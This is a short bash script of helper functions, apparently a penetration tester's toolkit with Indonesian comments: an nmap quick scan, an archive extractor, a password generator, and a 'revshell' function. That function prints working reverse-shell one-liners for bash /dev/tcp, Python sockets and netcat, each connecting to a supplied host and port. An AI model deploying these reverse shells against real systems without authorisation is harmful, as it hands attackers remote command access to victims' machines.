#!/bin/bash

# --- Port Scanner Cepat ---
fastscan() {
    if [ -z "$1" ]; then
        echo "Usage: fastscan <target>"
        return 1
    fi
    nmap -T4 -F -sV "$1"
}

# --- Extract All Archives ---
extract() {
    if [ -z "$1" ]; then
        echo "Usage: extract <file>"
        return 1
    fi
    case "$1" in
        *.tar.bz2)   tar xjf "$1"   ;;
        *.tar.gz)    tar xzf "$1"   ;;
        *.bz2)       bunzip2 "$1"   ;;
        *.rar)       unrar x "$1"   ;;
        *.gz)        gunzip "$1"    ;;
        *.tar)       tar xf "$1"    ;;
        *.tbz2)      tar xjf "$1"   ;;
        *.tgz)       tar xzf "$1"   ;;
        *.zip)       unzip "$1"     ;;
        *.Z)         uncompress "$1";;
        *.7z)        7z x "$1"      ;;
        *)           echo "'$1' tidak bisa diextract" ;;
    esac
}

# --- Reverse Shell Generator ---
revshell() {
    echo "=== Reverse Shell Generator ==="
    echo "1. Bash: bash -i >& /dev/tcp/$1/$2 0>&1"
    echo "2. Python: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo "3. Netcat: nc -e /bin/sh $1 $2"
}

# --- Random Password ---
genpass() {
    openssl rand -base64 32
}

# --- Export function ---
export -f fastscan extract revshell genpass